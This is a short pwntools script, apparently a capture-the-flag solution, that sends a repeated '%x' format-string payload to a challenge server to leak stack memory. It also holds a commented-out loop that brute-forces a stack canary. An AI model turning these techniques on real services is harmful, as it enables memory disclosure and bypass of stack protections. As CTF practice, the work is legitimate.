#Twitty Hackcenter 

from pwn import *

number = 0
canary = ""
var = ""

all = []

counter = 0

while(counter < 1):

	p = remote('enigma2017.hackcenter.com', 28252)

	l = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","1","2","3","4","5","6","7","8","9","0","!","@","#","$","%","^","&","*","(",")","-","_","+","=","<",">",".","/","?",":","{","}","[","]","|","'","`","~"]
	
	p.sendline("%x"*113)

	print(p.recv())

	var = p.recv()[113:]

	var = var.replace("BBBBBB","")

	all.append(var)

	counter += 1

	# p.sendline("B"*120 + canary + l[number])

	# print("BBBB" + canary + l[number])

	# var = p.recv()

	# if "Stack" in str(var):
	# 	number = number + 1
	# else:
	# 	canary += l[number]
	# 	number = 0
	# 	print(l[number])

list.sort(all)

print(all)

				



	


